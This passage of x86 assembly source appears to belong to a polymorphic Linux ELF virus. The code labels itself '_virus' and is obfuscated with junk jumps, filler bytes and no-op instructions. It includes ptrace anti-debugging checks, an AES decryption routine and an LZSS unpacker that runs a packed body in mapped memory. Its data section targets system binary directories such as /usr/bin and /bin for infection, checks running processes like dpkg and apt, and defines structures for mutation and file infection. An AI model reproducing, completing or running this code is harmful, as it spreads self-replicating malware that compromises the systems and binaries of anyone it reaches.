    mjmp        ..@123Np44z0cAA
..@e6z5qAZfoV89:
%ifndef ENABLE_DEBUGGING
    movv        r2, 0x200
    VAR         public, tracerline
    movr        r3, r5
%endif
    mjmp        ..@xsSINlihu9Au
..@xsSINlihu9Au:
    mjmp        ..@kZ1rSYslqTgg
db 0xa8, 0xb2, 0xaf
..@kZ1rSYslqTgg:
    mjmp        ..@sZydT2jZlUHJ
..@FY9Apzb9Ymqx:
    aesimc      xmm0,xmm1
    mjmp        ..@A3ZMK2XJYnNH
db 0x27
..@A3ZMK2XJYnNH:
    mjmp        ..@KZYW0FWvtLF0
db 0x30, 0x16, 0x2a
..@KZYW0FWvtLF0:
    mjmp        ..@yQLC36DiwCMO
..@JclmyuMjvr6p:
    jne         ..@QeQZ2DAEVMBa
    mjmp        ..@skvPSofT5Vna
..@8bdjkEC9ewL4:
    call        ..@L3bxxw1uVCTD
    movdqa      OWORD [rsi+0xc0], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    movr        rdi, rdi
    call        ..@9fwDTm3AWhb4
    mjmp        ..@ybDZhXvUM2kF
..@qceZFigsmYvq:
    syscall
    xor         rax, rax
    rep         nop
    movv        rax, SYS_FORK
    mjmp        ..@X9YNJyE6TXJJ
db 0x3d, 0xc9, 0x30
..@X9YNJyE6TXJJ:
    mjmp        ..@mSbGyi8LnybS
db 0xae, 0x6b, 0x47
..@mSbGyi8LnybS:
    mjmp        ..@LKGXQj3j2Ftz
db 0x0b, 0x6d, 0x60
..@LKGXQj3j2Ftz:
    mjmp        ..@GfZWDmKcBx5S
..@tegM694CfXR4:
    call        ..@9fwDTm3AWhb4
    movdqa      OWORD [rsi+0x30], xmm3
    mjmp        ..@z6sWNq1HJDHh
db 0x0e
..@z6sWNq1HJDHh:
    mjmp        ..@IP8w1fa1skUt
..@IP8w1fa1skUt:
    mjmp        ..@rM79ZOq8eDmJ
db 0x38
..@rM79ZOq8eDmJ:
    mjmp        ..@Gdi6WposrP5p
..@uO4tNzZxacvu:
    VAR         public, _virus
    mjmp        ..@eYsd1RBSyA9c
..@eYsd1RBSyA9c:
    mjmp        ..@ILw6Dlp1jyrc
..@ILw6Dlp1jyrc:
    mjmp        ..@EEh6rgX18T9F
db 0xa2
..@EEh6rgX18T9F:
    mjmp        ..@RkoUAtNrcfvk
..@gxaGO4iwHtoK:
    movr        rax, r2
    mjmp        ..@8lwSNF198NLh
..@UnNXzi0Dl2BI:
%ifndef ENABLE_DEBUGGING
    movr        r1, r5
%endif
    mjmp        ..@grPlNF0TyPLX
db 0x0d, 0xd7, 0xae
..@grPlNF0TyPLX:
    mjmp        ..@xZWnTyr8JYsN
db 0x35, 0x35
..@xZWnTyr8JYsN:
    mjmp        ..@JPyvYhcWd8Nl
..@yiZm0Sso4UOH:
    test        eax, eax
    jz          ..@4Uokn7brk35J
    mjmp        ..@FEoBWs88DPy5
db 0x11
..@FEoBWs88DPy5:
    mjmp        ..@D27xa3mogJLr
..@0U7YDtkeWfwr:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    test        rax, rax
    push        rdx
    pop         rdx
%endif
%endif
    mjmp        ..@PiOaJnOBeubQ
..@AnNb2WGrGJyU:
    push        rdi
    mjmp        ..@f3klAK3lpKK5
db 0x37, 0x63, 0x34
..@f3klAK3lpKK5:
    mjmp        ..@IrvRQcJsjMIO
db 0xa5, 0x64, 0x6f
..@IrvRQcJsjMIO:
    mjmp        ..@KAL9UfCKdUCQ
db 0x3e
..@KAL9UfCKdUCQ:
    mjmp        ..@9jQkHCVvSXka
..@s2gkP2rpDzi5:
    movdqu      xmm1, OWORD [rsp+0x90]
    push        rcx
    pop         rcx
    aesdec      xmm0, xmm1
    mjmp        ..@Lpe2gc6vlaRY
db 0xb2, 0xea, 0x21
..@Lpe2gc6vlaRY:
    mjmp        ..@4EO8CuGQmhux
..@OyXfcwXfA7S2:
    movdqu      OWORD [rsp+0xc0],xmm0
    mjmp        ..@saRg2Lud7AL6
db 0xef
..@saRg2Lud7AL6:
    mjmp        ..@W4arBnDxeaNm
db 0x1a, 0xf9
..@W4arBnDxeaNm:
    mjmp        ..@oRL5xeUUAt1A
..@QfGv614pPefE:
    ret
    mjmp        Memmem
..@7jniXg3dupzB:
%ifndef ENABLE_DEBUGGING
    movr        r1, rsp
%endif
    mjmp        ..@e6z5qAZfoV89
..@SSWXbZyZqvMo:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    and         rax, 0xff00
    movr        rbp, rbp
    shr         eax, 8
    movr        rax, rax
%endif
%endif
    mjmp        ..@6jzV0Z6lYcx5
db 0xe5
..@6jzV0Z6lYcx5:
    mjmp        ..@W2xx3RZg1O9W
db 0x04, 0xfa
..@W2xx3RZg1O9W:
    mjmp        ..@egQMRvUN3JVq
..@ZolNk7COlaiD:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jnz         ..@46qePee93Y4V
%endif
%endif
    mjmp        ..@ozYPudYqr2gd
db 0xcf, 0xa9
..@ozYPudYqr2gd:
    mjmp        ..@WBaXU3MgCEk7
..@oa95ySK2QoeZ:
    movr        r3, rax
    mov         r4, m4
    mjmp        ..@FVUX9DeE1aIR
..@PSX2Eu9cJcaT:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x20]
    mjmp        ..@H1F34F4rm0Sj
db 0xff, 0x08
..@H1F34F4rm0Sj:
    mjmp        ..@7XMVMCjf2sgG
..@ljURpHgrOWTl:
%ifndef ENABLE_DEBUGGING
    VAR         public, debugging
    movr        r2, r5
    movv        r1, 0x1
    movv        rax, SYS_WRITE
    syscall
%endif
    mjmp        ..@B6sCcvhXivwN
..@lILjAqREo9WW:
    movr        rbx, rdi
    mov         rsi, QWORD [rsp+1*bytes]
    mov         rcx, QWORD [rsp]
    cmp         QWORD [rsp+2*bytes], rcx
    mjmp        ..@JYjQKwCBsDsl
db 0xe8, 0x03, 0xe5
..@JYjQKwCBsDsl:
    mjmp        ..@2Hg38aIrrda1

;-----------------------------------------------------
; ENCRYPTED PART (The code below is encrypted but not 
; packed)
_decrypt:
;-----------------------------------------------------
; Encrypted Structures.
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Encrypted Proprocessor values.
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Encrypted code.
;-----------------------------------------------------
UnpackExecutableCode:
    mjmp        ..@mMYC3ar274Jr
..@uP0SgHafQLs8:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    mov         dl, BYTE [rbx]
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    movr        rdx, rdx
    mjmp        ..@WZQGuxLkDPZu
db 0xf5
..@WZQGuxLkDPZu:
    mjmp        ..@GEa2M1GGOHg4
..@JoNVaiueGaqI:
    xor         rbx, rbx
    mjmp        ..@OTIBKwLIttBl
db 0xdf, 0xdd, 0xc1
..@OTIBKwLIttBl:
    mjmp        ..@o2FAPcpFHvIj
..@zdWZiN4oRGdI:
    call        LzssDecoder
    mjmp        ..@NoHJrOBMmyCZ
..@k2joQ1vX3UdT:
%ifdef X86_64
    movv        rsi, original_virus_len-non_packed_len
    movv        rdx, 111b
    movv        r10, 0x22
    movv        r8, 0xffffffffffffffff
%endif
    mjmp        ..@Hwi2SKAvJmve
db 0x0d
..@Hwi2SKAvJmve:
    mjmp        ..@m8UMxWM86OL6
..@4QBZXfFgpimY:
    mjmp        ..@97XIL1SgWtQn
    mjmp        ..@ie6YWIUCrTRK
..@whG09rRwzvGw:
%ifdef X86_64
    pop         rbx
%endif
    mjmp        ..@Qc5U0OagLaSa
..@AnWgfxSKzetH:
    jg          ..@s3avcPJG8KpR
    mjmp        ..@sq0uUNIJ1NgS
db 0x03, 0xa9
..@sq0uUNIJ1NgS:
    mjmp        ..@C5ryDIFJ8WX4
..@HCCCkAPVUxhX:
    xchg        rsp, rsp
    mjmp        ..@WXZbbtQ20yYC
..@2c7zG7zEeNtw:
    test        dl, dl
    mjmp        ..@J0sx8ceonyzV
db 0x11, 0xa8, 0x4c
..@J0sx8ceonyzV:
    mjmp        ..@fcUCu43Ct8ty
..@DZ2D2JdwALJS:
%ifdef X86_64
    xor         r9, r9
%endif
    mjmp        ..@2mrlK8yrYQ1l
db 0x3f
..@2mrlK8yrYQ1l:
    mjmp        ..@k2joQ1vX3UdT
..@8FNBxiQQCIG2:
    sub         rsp, _UEC_OFF_size
    mjmp        ..@4sAsrr4i3Hf4
db 0x3c, 0xa1
..@4sAsrr4i3Hf4:
    mjmp        ..@cKr1WesctDlo
..@fpxvDzRMV6Wg:
    push        rsi
    mjmp        ..@hETCXcgXyFrl
db 0x36, 0xae, 0x0c
..@hETCXcgXyFrl:
    mjmp        ..@nUO7ApWNjxa9
db 0xd2, 0x14
..@nUO7ApWNjxa9:
    mjmp        ..@BBV6l0rYruCy
..@cfvEQVbKTThM:
%ifdef X86_32
    xchg        rsi, rsi
    int         0x80
%endif
    mjmp        ..@zcj36hjR3PmO
..@FIK7JOsMorwc:
    and         bx, WINDOW_LENGTH-1
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    mjmp        ..@I67y4ILHkEFr
db 0x4e, 0xf9
..@I67y4ILHkEFr:
    mjmp        ..@MIi2TSmpodOw
..@LXTmHndQuIMd:
    cmp         cl, dl
    mjmp        ..@IFvsV0P2588U
..@84Eps7Azw37t:
    xchg        rax, rax
    mjmp        ..@UPpsnj9UYg6M
..@S9XWEibUT0oV:
    xor         r3, r3
    mjmp        ..@wXXYW2BFcoDU
db 0xd7
..@wXXYW2BFcoDU:
    mjmp        ..@HCCCkAPVUxhX
..@Iod0qSKX1Ui7:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    mjmp        ..@9tFkJaEX4jNV
db 0xe0, 0xc0, 0x97
..@9tFkJaEX4jNV:
    mjmp        ..@TXQVM8wduZbi
..@EpVuceSRnBA7:
    push        rdi
    mjmp        ..@nFBnqEkICsLn
db 0xf4, 0xc8, 0x17
..@nFBnqEkICsLn:
    mjmp        ..@hUivfDSu0vma
..@2Q1aqUO6iAmk:
    movr        rbx, rsi
    add         bx, cx
    mjmp        ..@FIK7JOsMorwc
..@LTEaMXHVmATG:
    jnz         ..@WHjxab5Vwg20
    mjmp        ..@uP0SgHafQLs8
..@QduXviyongEL:
    movv        rcx, 8
    call        ..@kaFhC8wNDoLP
    xor         rdi, rdi
    mjmp        ..@erxitEMHrHml
..@m8UMxWM86OL6:
%ifdef X86_64
    movv        rax, SYS_MMAP
    syscall
%endif
    mjmp        ..@PmnLeKmd5oFv
db 0x92, 0xed
..@PmnLeKmd5oFv:
    mjmp        ..@gw2oFJG0Lxol
..@vxsPtXwP4Uyg:
%ifdef X86_32
    movv        edx, 111b
    movv        esi, 0x22
    movv        edi, 0xffffffff
%endif
    mjmp        ..@NOiLKGXyOB4X
..@96gyj2sIZG6X:
    add         ecx, 1
    mjmp        ..@vvPeuOTyLNKZ
db 0x28, 0x08
..@vvPeuOTyLNKZ:
    mjmp        ..@CJhbp3qLRGJe
..@CJhbp3qLRGJe:
    mjmp        ..@LXTmHndQuIMd
..@kaFhC8wNDoLP:
    pop         rdi
    xor         rax, rax
    mjmp        ..@PstpmmxI0Ans
db 0xa0, 0xfb
..@PstpmmxI0Ans:
    mjmp        ..@pg85SF0CpDs0
..@gw2oFJG0Lxol:
%ifdef X86_64
    push        rbx
%endif
    mjmp        ..@whG09rRwzvGw
LzssDecoder:
    mjmp        ..@hZBA6gPgyGiS
..@ezUcjaf0u8Rc:
    add         rsp, _LZSSD_OFF_size
    mjmp        ..@xwn9vn8juQCT
db 0x1f, 0x45
..@xwn9vn8juQCT:
    mjmp        ..@4T2TDKa65Y1l
..@AHtyUlymYJH8:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    movr        rsp, rsp
    mjmp        ..@LTEaMXHVmATG
..@LKIV0mN6s15k:
    xor         rdi, rdi
    mjmp        ..@2Q1aqUO6iAmk
..@ie6YWIUCrTRK:
    movv        rcx, POSITION_BITS
    mjmp        ..@Ra5EHqkxSrTw
..@UPpsnj9UYg6M:
    pop         rax
    mjmp        ..@zdWZiN4oRGdI
..@mMYC3ar274Jr:
    xor         rax, rax
    xor         r1, r1
    xor         r2, r2
    mjmp        ..@S9XWEibUT0oV
..@7x9xRaFgBgWu:
    movr        rsi, rax 
    mjmp        ..@76gzs1MHZQVo
..@melYdy5JJ4ZJ:
    xor         rax, rax
    xchg        rcx, rcx
    push        rsi
    mjmp        ..@9fNj2rAmVwI6
..@BBV6l0rYruCy:
    pop         rsi
    push        rdx
    pop         rdx
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mjmp        ..@p9ies4NvTkHH
..@p9ies4NvTkHH:
    mjmp        ..@iZ1GVlA8b71o
..@tiYCdMva29YB:
    xchg        rsp, rsp
    GGLOBAL     _packed
    movr        r1, r5
    mjmp        ..@OKahs3FjjovL
..@zvG0Pw5Z1rgM:
    movv        rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    mjmp        ..@fl1ZJcIIXWJv
..@Ra5EHqkxSrTw:
    call        ..@kaFhC8wNDoLP
    mjmp        ..@pJgbsTt3xgCf
db 0xcf, 0xe4
..@pJgbsTt3xgCf:
    mjmp        ..@FUty7UqXb6gd
..@FUty7UqXb6gd:
    mjmp        ..@7x9xRaFgBgWu
..@wqkPIRjH3QK9:
%ifdef X86_32
    pop         rbx
%endif
    mjmp        ..@72Y8PKW3bp42
..@72Y8PKW3bp42:
%ifdef X86_64
    xchg        rsi, rsi
%endif
    mjmp        ..@c9Jh6NkWeAV1
db 0xa0, 0x08
..@c9Jh6NkWeAV1:
    mjmp        ..@DZ2D2JdwALJS
..@cKr1WesctDlo:
    call        ExitProgram
    mjmp        ..@ohF3kVRcwTuV
db 0x3f
..@ohF3kVRcwTuV:
    mjmp        ..@2fxtkfuzKx9z
db 0xd5, 0x06
..@2fxtkfuzKx9z:
    mjmp        LzssDecoder
..@uLPBPwSX3iLG:
    syscall
    mjmp        ..@wOvZ16mj4FIA
db 0xcd
..@wOvZ16mj4FIA:
    mjmp        ..@EeR9H6qnWlqz
db 0x45, 0x08, 0x2a
..@EeR9H6qnWlqz:
    mjmp        ..@VVuqqP1x2Ng2
..@OKahs3FjjovL:
    GGLOBAL     virus_len
    mjmp        ..@8ov8xRKyQNwG
..@erxitEMHrHml:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mjmp        ..@mS83dBWDANIQ
db 0xb6, 0x34, 0xff
..@mS83dBWDANIQ:
    mjmp        ..@xlZiPl33GO2W
..@WXZbbtQ20yYC:
%ifdef X86_32
    movv        ecx, original_virus_len-non_packed_len
%endif
    mjmp        ..@vxsPtXwP4Uyg
..@eHK0QOX21SHQ:
%ifdef X86_32
    push        rbx
%endif
    mjmp        ..@wqkPIRjH3QK9
..@NoHJrOBMmyCZ:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    mov         m8, rax
    mjmp        ..@xQwUf5BqWdxd
db 0x98, 0x37, 0xaa
..@xQwUf5BqWdxd:
    mjmp        ..@TaAsqo8CcPVR
..@o2FAPcpFHvIj:
    xchg        rdi, rdi
    mjmp        ..@0zSSOwhIcxuN
db 0x4b
..@0zSSOwhIcxuN:
    mjmp        ..@vK8Gd19mkNZ5
db 0xef, 0xcc, 0x02
..@vK8Gd19mkNZ5:
    mjmp        ..@YDdDTD8LahFI
db 0x34
..@YDdDTD8LahFI:
    mjmp        ..@AHtyUlymYJH8
..@8qHDyPg5XBNs:
    call        ..@kaFhC8wNDoLP
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    mjmp        ..@AnWgfxSKzetH
..@TXQVM8wduZbi:
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    xchg        rdx, rdx
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    mjmp        ..@zvG0Pw5Z1rgM
..@wbax37Z3he0y:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    sub         rcx, 1
    mjmp        ..@rBkiKbhEDFCE
..@YXOo0I1DaJIu:
    xor         rdi, rdi
    mjmp        ..@f8ER083KQjMr
..@xlZiPl33GO2W:
    push        rdx
    mjmp        ..@e92eyT2E4WGI
db 0x9d, 0x61, 0x29
..@e92eyT2E4WGI:
    mjmp        ..@4MPaXZvp0Nkr
..@4MPaXZvp0Nkr:
    mjmp        ..@BYhAB5hpwcXn
..@hUivfDSu0vma:
    ret
    mjmp        ..@TW2s1VfiFpPF
db 0x3a
..@TW2s1VfiFpPF:
    mjmp        ..@fZpQO1AgE1zz
db 0xfc
..@fZpQO1AgE1zz:
    mjmp        ..@ZD1LOBSA0k83
..@97XIL1SgWtQn:
    movv        rcx, 1
    mjmp        ..@eM3zedV4fMQp
db 0x3f, 0xe6, 0x4a
..@eM3zedV4fMQp:
    mjmp        ..@8FoXT5B35iXR
db 0x0c, 0xfb
..@8FoXT5B35iXR:
    mjmp        ..@8qHDyPg5XBNs
..@GJUTkw3RRkK6:
    xchg        rdi, rdi
    mjmp        ..@oWRoz6WCvuRn
..@oWRoz6WCvuRn:
    mjmp        ..@ezUcjaf0u8Rc
..@C5ryDIFJ8WX4:
    movr        rdi, rdi
    mjmp        ..@wB9RKUJUGn8v
..@rBkiKbhEDFCE:
    jnz         ..@AHtyUlymYJH8
    mjmp        ..@NlH4NG28EDUX
..@GEa2M1GGOHg4:
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    movr        rbp, rbp
    dec         QWORD [rsp+_LZSSD_OFF.length]
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    mjmp        ..@kGWIwjagAlgh
db 0xe3
..@kGWIwjagAlgh:
    mjmp        ..@kkRchlMs8tm1
db 0x93
..@kkRchlMs8tm1:
    mjmp        ..@WHjxab5Vwg20
..@76gzs1MHZQVo:
    movv        rcx, LENGTH_BITS
    call        ..@kaFhC8wNDoLP
    mjmp        ..@GDmi2FcADl5c
..@hqZcoJYCc7rU:
    push        rax
    mjmp        ..@84Eps7Azw37t
..@NOiLKGXyOB4X:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
    movv        eax, SYS_MMAP2
%endif
    mjmp        ..@P0NUXMFmoC0k
db 0xf2, 0xf7
..@P0NUXMFmoC0k:
    mjmp        ..@cfvEQVbKTThM
..@Qc5U0OagLaSa:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    mjmp        ..@hBST676muiFZ
..@hBST676muiFZ:
    mjmp        ..@tiYCdMva29YB
..@pg85SF0CpDs0:
    rep         nop
    xor         rdx, rdx
    mjmp        ..@PQaqHpqdA0zZ
..@PQaqHpqdA0zZ:
    mjmp        ..@feJveSiURWEu
db 0xc6
..@feJveSiURWEu:
    mjmp        ..@JoNVaiueGaqI
..@s3avcPJG8KpR:
    test        rax, rax
    mjmp        ..@uE7FY1TQ41Je
..@Erphl5odRDoq:
    pop         rsi
    mjmp        ..@8FNBxiQQCIG2
..@9fNj2rAmVwI6:
    pop         rsi
    movr        rbx, rbx
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    movv        r2, original_virus_len-non_packed_len
    movv        rax, SYS_MUNMAP
    mjmp        ..@uLPBPwSX3iLG
..@WHjxab5Vwg20:
    shl         eax, 1
    mjmp        ..@Iq7g5okc3RZd
..@IFvsV0P2588U:
    jle         ..@2Q1aqUO6iAmk
    mjmp        ..@97XIL1SgWtQn
..@fcUCu43Ct8ty:
    jz          ..@wbax37Z3he0y
    movr        rdi, rdi
    or          eax, 1
    mjmp        ..@wbax37Z3he0y
..@8ov8xRKyQNwG:
    xor         r2, r2
    mov         r2d, DWORD [r5]
    sub         r2, non_packed_len
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    mjmp        ..@hqZcoJYCc7rU
..@iZ1GVlA8b71o:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    inc         DWORD [rsp+_LZSSD_OFF.index]
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    xchg        rsp, rsp
    mjmp        ..@4QBZXfFgpimY
..@NlH4NG28EDUX:
    movr        rdx, rdx
    mjmp        ..@JxHQjJlzb3zT
db 0xac, 0x4e, 0xa8
..@JxHQjJlzb3zT:
    mjmp        ..@cwqYvJCKOVUp
db 0x13
..@cwqYvJCKOVUp:
    mjmp        ..@EpVuceSRnBA7
..@hZBA6gPgyGiS:
    sub         rsp, _LZSSD_OFF_size
    mjmp        ..@ipdBGD7h5aRN
db 0x46
..@ipdBGD7h5aRN:
    mjmp        ..@c6IZRDiOQBBL
db 0xa6, 0x30, 0x41
..@c6IZRDiOQBBL:
    mjmp        ..@Iod0qSKX1Ui7
..@GDmi2FcADl5c:
    add         rax, 1
    movr        rdx, rax
    xor         rax, rax
    xor         rcx, rcx
    mjmp        ..@LKIV0mN6s15k
..@wB9RKUJUGn8v:
    mjmp        ..@GJUTkw3RRkK6
    mjmp        ..@kaFhC8wNDoLP
..@or3e6pP3Ywmw:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    mjmp        ..@YV2zXG31VJAW
db 0xf8
..@YV2zXG31VJAW:
    mjmp        ..@9tK2gIPOAcMg
db 0xa6, 0xf7
..@9tK2gIPOAcMg:
    mjmp        ..@fpxvDzRMV6Wg
..@BYhAB5hpwcXn:
    pop         rdx
    mov         BYTE [rbx], al
    mjmp        ..@or3e6pP3Ywmw
..@SMSTD8nYNMwE:
    mjmp        ..@97XIL1SgWtQn
    mjmp        ..@v8NRA6ofBmEV
db 0x0b
..@v8NRA6ofBmEV:
    mjmp        ..@r7I6cTOLnrvL
db 0xcf, 0x10, 0xff
..@r7I6cTOLnrvL:
    mjmp        ..@s3avcPJG8KpR
..@VVuqqP1x2Ng2:
    push        rsi
    mjmp        ..@1ECAQuF5FNsT
db 0xe8, 0x37, 0x6c
..@1ECAQuF5FNsT:
    mjmp        ..@Erphl5odRDoq
..@zcj36hjR3PmO:
%ifdef X86_32
    pop         ebp
%endif
    mjmp        ..@eHK0QOX21SHQ
..@MIi2TSmpodOw:
    movr        rbp, rbp
    push        rsi
    pop         rsi
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    mjmp        ..@z0ASqvkidily
db 0x97, 0x37, 0xfc
..@z0ASqvkidily:
    mjmp        ..@YXOo0I1DaJIu
..@4T2TDKa65Y1l:
    ret
    mjmp        ..@uRHffL3RHraC
..@uRHffL3RHraC:
..@fl1ZJcIIXWJv:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    movv        rax, 0x20
    rep         stosb
    mjmp        ..@DOyOYHFWDJjK
db 0x2a, 0xa1
..@DOyOYHFWDJjK:
    mjmp        ..@SMSTD8nYNMwE
..@TaAsqo8CcPVR:
    call        rax
    mjmp        ..@melYdy5JJ4ZJ
..@Iq7g5okc3RZd:
    xchg        rsi, rsi
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    mjmp        ..@2c7zG7zEeNtw
..@f8ER083KQjMr:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    inc         DWORD [rsp+_LZSSD_OFF.index]
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    mjmp        ..@TOy9QLPYOHXO
..@TOy9QLPYOHXO:
    mjmp        ..@96gyj2sIZG6X
..@ZD1LOBSA0k83:
    movr        rsp, rsp
    mjmp        ..@GJUTkw3RRkK6
..@uE7FY1TQ41Je:
    jz          ..@ie6YWIUCrTRK
    mjmp        ..@QduXviyongEL

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    mjmp        Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _MUTA_OFF
    .start      resq 0x1
    .index      resd 0x1
    .size       resd 0x1
    .key        resq 0x1
    .random_BYTE resb 0x1
endstruc
struc _AESE_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
    .keyprev    resd 0x1
    .meta_ptr   resq 0x1
endstruc
struc _KEYGEN_OFF
    .bufferaddr resq 0x1
    .fd         resd 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs: 
proc6:      db "dpkg", 0
proc5:      db "apt", 0
proc4:      db "ps", 0
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

bash:       db "/bin/bash", 0
urandom:    db "/dev/urandom", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    mjmp        ..@QEikAykQJPSp
..@nNoKPSdGeqA6:
    pop         rbx
    jnz         ..@Tc8tIxV9F9JB
    mjmp        ..@k1ggyHDOk8Dm
    mjmp        ..@4EEoCKuNso8W
db 0xfb, 0xc8, 0x1c
..@4EEoCKuNso8W:
    mjmp        ..@3ukOH0QxxvSK
db 0xd9, 0x6f, 0xc4
..@3ukOH0QxxvSK:
    mjmp        ..@k1ggyHDOk8Dm
..@isQKgYPRZ55Y:
    xchg        rcx, rcx
    mjmp        ..@89OYTLEz44qi
db 0xa8, 0x23, 0x99
..@89OYTLEz44qi:
    mjmp        ..@k4RBL5Bol62q
db 0x1b, 0xd3
..@k4RBL5Bol62q:
    mjmp        ..@MIu7O7rN3ISB
..@gISPNvXMJLaS:
    movr        rax, rax
    mjmp        ..@xfE77TIRai91
..@DEd3w6htTNAD:
    movr        rsi, rsi
    push        rax
    pop         rax
    xchg        rsi, rsi
    mjmp        ..@jEIFAnHU1IVi
db 0x29, 0xf1, 0xf4
..@jEIFAnHU1IVi:
    mjmp        ..@QThjoW5fpZ6s
..@KCSBixvx3nQq:
    add         rdi, rax
    mjmp        ..@jNfNJk6381aG
..@PkRWtQKNxlfU:
    mov         r1, m6
    movv        r2, original_virus_len+PADDING
    movv        rax, SYS_MUNMAP
    mjmp        ..@wFuC7bFTuiwy
..@mK5XDdpvHJaA:
    movr        rbx, rbx
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    cmp         rax, 0x00
    jle         ..@vMEdpcG52Qss
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    mjmp        ..@lSN7CAeyVhTg
..@bq45X0uhB0ru:
    cmp         BYTE [r5], DT_DIR
    mjmp        ..@ujcsNPLSJSGi
db 0x9c, 0x94, 0x07
..@ujcsNPLSJSGi:
    mjmp        ..@fZeTuBZJvYdE
db 0xa3, 0x14
..@fZeTuBZJvYdE:
    mjmp        ..@hBd7V3MB4n7h
db 0xda, 0xd2
..@hBd7V3MB4n7h:
    mjmp        ..@oiqRuGljYRuA
db 0xb2, 0xd8, 0x22
..@oiqRuGljYRuA:
    mjmp        ..@psHENuW4azI0
..@kvTAe6yE0U2k:
    movv        rcx, 0x20
    mjmp        ..@wTLsR18oalqA
db 0x39, 0xe4, 0x42
..@wTLsR18oalqA:
    mjmp        ..@cnfYyN59VGPk
..@5T4ajhxQz6sW:
    sub         r2, 1
